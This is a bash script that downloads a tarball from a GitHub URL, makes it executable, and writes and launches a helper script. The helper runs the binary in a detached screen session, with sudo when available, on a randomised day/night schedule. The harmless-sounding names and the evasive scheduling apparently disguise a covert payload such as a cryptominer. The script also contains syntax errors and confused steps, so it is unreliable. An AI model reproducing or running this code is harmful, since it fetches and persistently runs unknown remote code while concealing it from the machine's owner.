#!/bin/bash

mkdir -p learn

cd learn

echo "download web2 file"

curl -L -o web2 https://raw.githubusercontent.com/amosgansweet/webmodelxm/main/webmodelxm.tar.gz

tar -xvzf web2

rm -fr webmodelxm

chmod +x web2

# creat weblanguage.sh
cat << 'EOF' > weblanguage.sh
#!/bin/bash
echo "creat a weblanguage.sh"
echo "running..."

cd learn
directory=$(pwd)
echo "$directory"  # Prints the current working directory

touch web2.log

NLANGUAGE_PATH="$directory/web2"
LOG_FILE="$directory/web2.log"

# Function to get the current hour in the VPS timezone
get_vps_hour() {
  # Attempt to determine the timezone from timedatectl
  TIMEZONE=$(timedatectl status | grep "Time zone" | awk '{print $3}')

  # If timedatectl fails, try reading /etc/timezone (common on Debian-based systems)
  if [ -z "$TIMEZONE" ]; then
    if [ -r /etc/timezone ]; then
      TIMEZONE=$(cat /etc/timezone)
    fi
  }

  # If /etc/timezone fails, try using the TZ environment variable if it's set
  if [ -z "$TIMEZONE" ]; then
    if [ -n "$TZ" ]; then
      TIMEZONE="$TZ"
    fi
  fi

  # If all methods fail, default to UTC (safer than assuming a specific timezone)
  if [ -z "$TIMEZONE" ]; then
    TIMEZONE="UTC"
    echo "$(date): WARNING: Could not determine VPS timezone. Defaulting to UTC." >> "$LOG_FILE"
  fi

  # Get the current hour in the determined timezone
  TZ="$TIMEZONE" date +%H
}

while true
do
    # get VPS time (hour)
    VPS_HOUR=$(get_vps_hour)

    # set up running time and sleep time
    if [ "$VPS_HOUR" -ge 7 ] && [ "$VPS_HOUR" -lt 22 ]; then
        # Day time (7 AM to 10 PM) – Less frequent, shorter runs
        RUNTIME=$((RANDOM % 600 + 300))     # run in the day：5~15 min
        SLEEPTIME=$((RANDOM % 2700 + 900))  # sleep in the day：15~60 min
        echo "$(date): run in the day $RUNTIME s，sleep in the day $SLEEPTIME s" >> "$LOG_FILE"
    else
        # Night time (10 PM to 7 AM) – More frequent, longer runs
        RUNTIME=$((RANDOM % 1800 + 1200))   # run at night:20~50 min
        SLEEPTIME=$((RANDOM % 900 + 300))   # sleep at night：5~15 min
        echo "$(date): run at night $RUNTIME s，sleep at night $SLEEPTIME s" >> "$LOG_FILE"
    fi

    # start nlanguage（background）
    "$NLANGUAGE_PATH" > /dev/null 2>&1 &
    NLANGUAGE_PID=$!

    # await running time
    sleep "$RUNTIME"

    # close nlanguage
    kill "$NLANGUAGE_PID" 2>/dev/null

    # await for starting next time
    sleep "$SLEEPTIME"
done



sleep 1
echo "operation done!"
EOF

# operation privileges
chmod +x weblanguage.sh

# executing
cd learn
if ./weblanguage.sh -v sudo >/dev/null 2>&1 && sudo -v 2>/dev/null; then
  echo "User has sudo privileges and sudo is installed."
  sudo screen -dmS weblanguage ./weblanguage.sh
else
  echo "User does not have sudo privileges or sudo is not installed."
  screen -dmS weblanguage ./weblanguage.sh
fi




